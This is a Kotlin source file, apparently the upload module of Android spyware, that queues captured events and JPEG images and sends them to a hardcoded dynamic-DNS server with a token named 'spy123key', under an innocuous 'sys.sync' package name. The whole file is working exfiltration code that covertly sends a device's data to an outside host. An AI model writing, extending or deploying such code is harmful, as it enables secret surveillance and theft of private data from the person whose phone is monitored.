package com.sys.sync

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object Net {
    var deviceId = "redmi"
    var serverUrl = "http://yikri.duckdns.org:5000"
    var token = "spy123key"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private val buffer = ArrayDeque<JSONObject>()
    private val lock = Any()

    fun add(type: String, target: String, title: String? = null, payload: String? = null) {
        val o = JSONObject()
        o.put("device_id", deviceId); o.put("type", type); o.put("target", target)
        if (title != null) o.put("title", title)
        if (payload != null) o.put("payload", payload)
        o.put("ts", System.currentTimeMillis())
        synchronized(lock) { buffer.addLast(o); if (buffer.size > 8000) buffer.removeFirst() }
    }

    fun flush() {
        val batch: List<JSONObject>
        synchronized(lock) { if (buffer.isEmpty()) return; batch = buffer.toList(); buffer.clear() }
        val arr = JSONArray(); batch.forEach { arr.put(it) }
        val body = JSONObject().put("events", arr).toString().toRequestBody("application/json".toMediaType())
        val req = Request.Builder().url("$serverUrl/ingest")
            .addHeader("X-Agent-Token", token).post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(c: Call, e: java.io.IOException) {
                synchronized(lock) { batch.reversed().forEach { buffer.addFirst(it) } }
            }
            override fun onResponse(c: Call, r: Response) { r.close() }
        })
    }

    fun uploadImage(bytes: ByteArray, name: String) {
        val body = bytes.toRequestBody("image/jpeg".toMediaType())
        val req = Request.Builder().url("$serverUrl/upload?name=$name&device=$deviceId")
            .addHeader("X-Agent-Token", token).post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(c: Call, e: java.io.IOException) {}
            override fun onResponse(c: Call, r: Response) { r.close() }
        })
    }
}
